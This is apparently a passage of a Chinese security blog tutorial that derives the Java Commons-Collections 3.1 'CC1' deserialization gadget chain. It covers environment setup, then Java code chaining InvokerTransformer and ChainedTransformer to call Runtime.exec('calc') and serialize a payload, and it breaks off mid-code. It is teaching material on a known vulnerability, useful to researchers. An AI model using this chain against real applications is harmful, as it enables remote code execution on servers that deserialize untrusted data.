[{"title":"Java反序列化之 CC1 链从0到1（手撕EXP）","url":"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/","content":"<p>声明：本篇文章作者YDJA，本文属i春秋原创奖励计划，未经许可禁止转载。</p>\n<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>承接上文的 URLDNS 链，这次我们来分析能够命令执行的CC1链，涉及到的知识点更多，分析起来也更复杂些。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"0x01-前置知识\"><a href=\"#0x01-前置知识\" class=\"headerlink\" title=\"0x01 前置知识\"></a>0x01 前置知识</h1><h2 id=\"1-1-Commons-Collections\"><a href=\"#1-1-Commons-Collections\" class=\"headerlink\" title=\"1.1 Commons-Collections\"></a>1.1 Commons-Collections</h2><p>Commons-Collections 是一个强大而灵活的工具库，它提供了许多可用于处理集合数据的实用功能。通过使用 Commons-Collections，开发人员可以更高效地编写代码，减少重复的工作，并提高程序的性能和可读性。</p>\n<h2 id=\"1-2-Java-动态代理\"><a href=\"#1-2-Java-动态代理\" class=\"headerlink\" title=\"1.2 Java 动态代理\"></a>1.2 Java 动态代理</h2><p>Java 动态代理是一种在运行时动态生成代理类的机制，可以用于处理某些通用的横切关注点，如性能监控、事务管理、安全检查等。通过使用动态代理，我们可以在不修改原有代码的基础上扩展或增强程序的功能。</p>\n<p>Java 动态代理的实现依赖于两个重要的 API：</p>\n<ul>\n<li>InvocationHandler 接口：它定义了一个单一的方法 invoke()，用于处理代理对象上的方法调用。在使用Java动态代理时，我们需要创建一个实现了 InvocationHandler 接口的类，并在其中实现invoke()方法。</li>\n<li>Proxy 类：它提供了一个静态方法 newProxyInstance()，用于创建一个代理对象。该方法需要传入一个类加载器、一组接口和一个 InvocationHandler 对象，然后返回一个代理对象。</li>\n</ul>\n<p>Java 动态代理基于接口代理的机制，所以被代理的对象<strong>必须至少实现一个接口</strong>。在调用代理对象的方法时，实际上会<strong>自动触发代理对象上重写的 invoke() 方法</strong>，由其负责调用被代理对象上的对应方法。</p>\n<p>示例代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.InvocationHandler;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Method;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DynamicProxy</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 创建目标对象</span></span><br><span class=\"line\">        <span class=\"type\">MyInterface</span> <span class=\"variable\">target</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyInterfaceImpl</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 创建动态代理对象</span></span><br><span class=\"line\">        <span class=\"type\">MyInvocationHandler</span> <span class=\"variable\">handler</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyInvocationHandler</span>(target);</span><br><span class=\"line\">        <span class=\"type\">MyInterface</span> <span class=\"variable\">proxy</span> <span class=\"operator\">=</span> (MyInterface) Proxy.newProxyInstance(</span><br><span class=\"line\">                target.getClass().getClassLoader(),</span><br><span class=\"line\">                target.getClass().getInterfaces(),</span><br><span class=\"line\">                handler);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 调用代理对象的方法</span></span><br><span class=\"line\">        proxy.myMethod();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">interface</span> <span class=\"title class_\">MyInterface</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">myMethod</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyInterfaceImpl</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">MyInterface</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">myMethod</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;myMethod is called&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MyInvocationHandler</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">InvocationHandler</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Object target;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MyInvocationHandler</span><span class=\"params\">(Object target)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.target = target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Before invoking &quot;</span> + method.getName());</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> method.invoke(target, args);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;After invoking &quot;</span> + method.getName());</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在上述示例中，我们首先创建了一个目标对象 target，然后使用其实现类 MyInterfaceImpl 创建了一个 MyInvocationHandler 对象。该对象实现了 InvocationHandler 接口，并覆盖了其中的 invoke() 方法，在方法调用前后分别输出了日志。接下来，我们使用 Proxy.newProxyInstance() 方法创建了一个代理对象 proxy，并将 target 对象和 handler 对象传入其中。最后，我们通过 proxy 对象来调用 myMethod() 方法，此时会触发代理对象上的 invoke() 方法，从而在控制台中输出相应的日志信息。</p>\n<p>需要注意的是，<strong>动态代理只能代理接口，而无法代理类</strong>。</p>\n<h1 id=\"0x02-环境搭建\"><a href=\"#0x02-环境搭建\" class=\"headerlink\" title=\"0x02 环境搭建\"></a>0x02 环境搭建</h1><h2 id=\"2-1-jdk版本：jdk1-8u65\"><a href=\"#2-1-jdk版本：jdk1-8u65\" class=\"headerlink\" title=\"2.1 jdk版本：jdk1.8u65\"></a>2.1 jdk版本：jdk1.8u65</h2><p>选择该版本的原因是 jdk8u71 之后就有漏洞修复了，其他版本的也可能会出现无法执行命令的问题</p>\n<h2 id=\"2-1-依赖：Commons-Collections3-1\"><a href=\"#2-1-依赖：Commons-Collections3-1\" class=\"headerlink\" title=\"2.1 依赖：Commons-Collections3.1\"></a>2.1 依赖：Commons-Collections3.1</h2><p>3.1-3.2.1 都可以</p>\n<h2 id=\"2-3-详细步骤\"><a href=\"#2-3-详细步骤\" class=\"headerlink\" title=\"2.3 详细步骤\"></a>2.3 详细步骤</h2><p>新建一个 maven 项目，选择提前装好的 jdk1.8u65。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753138-44.png\" alt=\"img\"></p>\n<p>在 pom.xml 中添加 Commons-Collections3.1 依赖。（可以去 Maven 仓库下）</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-1.png\" alt=\"img\"></p>\n<p>代码添加后还要重新加载一下才能导入依赖。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-2.png\" alt=\"img\"></p>\n<p>除此之外，jdk 的自带包中许多文件是 .class 文件，在 IDEA 分析利用链的时候看到的这些文件都是 IDEA 反编译出来的，代码还原度不高，为了方便调试，我们需要去把这一部分的源码补上。</p>\n<p>在该网站（<a href=\"https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4%EF%BC%89%E5%B0%86%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E7%9A%84\">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4）将对应版本的</a> zip 源码下载下来。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-3.png\" alt=\"img\"></p>\n<p>将 jdk-af660750b2f4\\src\\share\\classes\\ 目录下的 sun 文件夹复制下来，然后去我们的 jdk 目录下，将src.zip解压，把刚刚复制的sun文件夹放进去。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-4.png\" alt=\"img\"></p>\n<p>最后回到 IDEA，在项目结构的 SDK 处将该目录补上，再点应用就完成了。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-5.png\" alt=\"img\"></p>\n<p>有 poc 在手的可以先测试一下。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-6.png\" alt=\"img\"></p>\n<p>搭建完成</p>\n<h1 id=\"0x03-漏洞成因\"><a href=\"#0x03-漏洞成因\" class=\"headerlink\" title=\"0x03 漏洞成因\"></a>0x03 漏洞成因</h1><h2 id=\"3-1-InvokerTransformer-类\"><a href=\"#3-1-InvokerTransformer-类\" class=\"headerlink\" title=\"3.1 InvokerTransformer 类\"></a>3.1 InvokerTransformer 类</h2><p>在 Commons-Collections 中有一个 Transformer 接口，里面声明了一个 transform 方法，该方法接收一个对象。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753128-7.png\" alt=\"img\"></p>\n<p>漏洞利用点出现在 Commons-Collections 中 InvokerTransformer 类，该类继承了 Transformer 接口并且重写了 transform 方法，该方法通过反射（反射的基础知识在 DNSURL 链已经提过，师傅们可以自行了解）调用指定方法，并且该指定方法和其参数等在该类的构造方法中被赋值，是我们可控的。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-8.png\" alt=\"img\"></p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-9.png\" alt=\"img\"></p>\n<p>结合反射，我们可以构造出一个简单的命令执行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">rce</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        rce.transform(Runtime.getRuntime());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>相当于执行了常见的 Runtime.getRuntime().exec(“calc”);</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-10.png\" alt=\"img\"></p>\n<p>在后续的利用链分析过程中，我们将基于此漏洞点一步一步串起整个链条。</p>\n<h1 id=\"0x04-利用链分析\"><a href=\"#0x04-利用链分析\" class=\"headerlink\" title=\"0x04 利用链分析\"></a>0x04 利用链分析</h1><p>CC1 链实际上有两条，大部分地方都相同，根据其不同点所在的地方分别称之为 TransformedMap <strong>链和</strong> LazyMap 链。</p>\n<h2 id=\"4-1-TransformedMap-链\"><a href=\"#4-1-TransformedMap-链\" class=\"headerlink\" title=\"4.1 TransformedMap 链\"></a>4.1 TransformedMap <strong>链</strong></h2><h3 id=\"4-1-1-ChainedTransformer-类\"><a href=\"#4-1-1-ChainedTransformer-类\" class=\"headerlink\" title=\"4.1.1 ChainedTransformer 类\"></a>4.1.1 ChainedTransformer 类</h3><p>在知道了 InvokerTransformer 类存在漏洞利用点之后，首先我们需要找到其他类中能够调用 transform 方法的地方。（因为反序列化并不能直接触发 InvokerTransformer 类，我们知道 transform 方法声明于 Transformer 接口，如果找到一个类能够直接或者间接被 readObject 方法触发，而该类继承了 Transformer 接口重写了 transform 方法且调用此 transform 方法的对象是我们可控的，所以我们将其链接到 InvokerTransformer 对象就可以触发漏洞了，接下来我们利用链的构造都是基于这个思路。）</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-11.png\" alt=\"img\"></p>\n<p>有挺多地方的，这里我们就不逐一分析，直接定位到可以利用的 ChainedTransformer 类，查看它重写的 transform 方法。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-12.png\" alt=\"img\"></p>\n<p>这段代码接受一个对象作为输入，循环遍历 iTransformers 数组，然后调用数组成员 transform 方法对输入对象进行转换，并将转换后的结果赋值给 object 变量。继续循环，使用下一个转换器对 object 进行转换，直到遍历完所有转换器。返回最终转换后的对象。</p>\n<p>我们接着定位到 iTransformers 的赋值位置。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-13.png\" alt=\"img\"></p>\n<p>可以发现其位于 ChainedTransformer 类的构造函数中，并且 iTransformers 数组的值是一个可以自定义的 Transformer 数组，所以我们将该数组的值设置为 InvokerTransformer 对象，再调用 ChainedTransformer 对象的tansform 方法并传入 Runtime.getRuntime() 就能命令执行。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">InvokerTransformer</span> <span class=\"variable\">invokertransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;invokertransformer&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        chainedtransformer.transform(Runtime.getRuntime());</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-14.png\" alt=\"img\"></p>\n<p>但是这里存在一个问题，我们都知道 Runtime 类没有继承 Serializable 接口，不支持序列化的操作，但是 Runtime.class 是支持的。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-15.png\" alt=\"img\"></p>\n<p>所以我们需要通过 Runtime.class 获取一个能够支持序列化操作的 Runtime 实例，而 Runtime 类中的 getRuntime 方法就是获取一个 Runtime 实例。</p>\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-16.png\" alt=\"img\"></p>\n<p>所以我们只需要结合上一篇文章讲到的反射知识就能成功执行命令。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> Runtime.class;</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">getRuntimeMethod</span> <span class=\"operator\">=</span> c.getMethod(<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"type\">Runtime</span> <span class=\"variable\">getRuntime</span> <span class=\"operator\">=</span> (Runtime) getRuntimeMethod.invoke(<span class=\"literal\">null</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">exec</span> <span class=\"operator\">=</span> c.getMethod(<span class=\"string\">&quot;exec&quot;</span>, String.class);</span><br><span class=\"line\">exec.invoke(getRuntime, <span class=\"string\">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-17.png\" alt=\"img\"></p>\n<p>实际上就是一个反复利用反射和 invoke 方法调用函数的过程，而我们前面提到的 InvokerTransformer 类的 transform 方法正好能完成这个过程。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">getRuntimeMethod</span> <span class=\"operator\">=</span> (Method) <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;).transform(Runtime.class);</span><br><span class=\"line\"><span class=\"type\">Runtime</span> <span class=\"variable\">getRuntime</span> <span class=\"operator\">=</span> (Runtime) <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;).transform(getRuntime);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-18.png\" alt=\"img\"></p>\n<p>而这个操作正好就是一个循环调用 InvokerTransformer 类的 transform 方法的过程，这时我们就会想到 ChainedTransformer 类的 transform 方法，不正好就是实现了这样一个过程吗，所以我们直接移植过去。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        chainedtransformer.transform(Runtime.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2023/11/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-CC1-%E9%93%BE%E4%BB%8E0%E5%88%B01%EF%BC%88%E6%89%8B%E6%92%95EXP%EF%BC%89/1699218753129-19.png\" alt=\"img\"></p>\n<p>然后我们试一下序列化和反序列化操作。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">CC1TransformedMap</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Serializable</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class, Class[].class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"literal\">null</span>, <span class=\"literal\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;String.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;),</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedtransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(chainedtransformer);</span><br><span class=\"line\">        System.out.println(unserialize(<span class=\"string\">&quot;payload.ser&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        chainedtransformer.transform(Runtime.class);</span><br><span class=\"line\"></span><br><span 